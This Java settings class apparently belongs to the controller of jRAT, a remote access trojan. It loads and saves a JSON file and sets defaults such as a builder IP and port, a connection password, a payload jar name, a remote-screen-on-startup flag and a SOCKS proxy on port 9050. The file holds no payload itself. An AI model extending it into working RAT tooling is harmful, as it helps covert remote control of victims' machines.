package io.jrat.controller.settings;

import com.cedarsoftware.util.io.JsonObject;
import com.cedarsoftware.util.io.JsonReader;
import com.cedarsoftware.util.io.JsonWriter;
import io.jrat.controller.Globals;
import io.jrat.controller.ui.Columns;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;


public class Settings extends AbstractStorable {

	private static final Settings instance = new Settings();

	private transient JsonObject settings = new JsonObject();

	public static Settings getGlobal() {
		return instance;
	}

	public String getString(String key) {
		Object obj = settings.get(key);
		return obj == null ? "" : (String) obj;
	}

	public Object get(String key) {
		return settings.get(key);
	}

	public int getInt(String key) {
		Object obj = settings.get(key);
		return obj == null ? -1 : (Integer) obj;
	}

	public boolean getBoolean(String key) {
		Object obj = settings.get(key);
		return obj == null ? false : obj.toString().equalsIgnoreCase("true");
	}

	public void set(String key, Object value) {
		settings.put(key, value);
	}

	public void setColumn(String name, boolean show) {
		Map<String, Boolean> columns = (HashMap<String, Boolean>) settings.get("columns");
		columns.put(name, show);
	}

	public boolean isColumnSelected(String column) {
		Map<String, Boolean> columns = (HashMap<String, Boolean>) settings.get("columns");

		Boolean v = columns.get(column) == null || columns.get(column);

		return v;
	}

	public void load() throws Exception {
		try {
			Map args = new HashMap();
			args.put(JsonReader.USE_MAPS, true);

			settings = (JsonObject) JsonReader.jsonToJava(new FileInputStream(getFile()), args);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		if (settings.size() == 0) {
			addDefault();
		}
	}

	public void save() throws Exception {
		try {
			PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(getFile())));

			Map args = new HashMap();
			args.put(JsonWriter.TYPE, false);
			pw.print(JsonWriter.formatJson(JsonWriter.objectToJson(settings, args)));

			pw.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public void addDefault() {
		set("bip", "127.0.0.1");
		set("bport", 1336);
		set("bid", "Name");
		set("bpass", "pass");
		set("brecat", 10);
		set("traynote", true);
		set("stats", true);
		set("jarname", "File");
		set("remotescreenstartup", false);
		set("askurl", true);
		set("max", -1);
		set("geoip", true);
		set("proxy", false);
		set("proxyhost", "127.0.0.1");
		set("proxyport", 9050);
		set("proxysocks", true);
		set("plugintransfer", false);
		set("rowheight", 30);

		Map<String, Boolean> columns = new HashMap<String, Boolean>();
		set("columns", columns);

		for (Columns c : Columns.values()) {
			columns.put(c.getName(), c.isDefault());
		}
	}

	@Override
	public File getFile() {
		return new File(Globals.getSettingsDirectory(), "settings.json");
	}
}
